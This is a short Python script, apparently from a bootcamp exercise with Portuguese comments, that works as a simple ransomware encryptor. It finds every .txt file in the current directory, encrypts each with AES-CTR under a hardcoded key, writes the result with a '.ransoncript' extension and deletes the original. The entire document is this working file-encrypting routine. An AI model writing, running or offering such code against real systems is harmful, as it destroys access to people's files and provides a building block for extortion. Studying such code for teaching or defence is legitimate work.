import os
import pyaes

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        file_data = file.read()
    
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)
    
    encrypted_file_path = f"{file_path}.ransoncript"
    with open(encrypted_file_path, "wb") as new_file:
        new_file.write(crypto_data)
    
    os.remove(file_path)
    print(f"Arquivo {file_path} criptografado com sucesso!")

# Definir chave de criptografia
key = b"cripto_bootcamp1"  # 16 bytes

# Buscar todos os arquivos .txt no diretório atual
for file_name in os.listdir():
    if file_name.endswith(".txt"):
        encrypt_file(file_name, key)
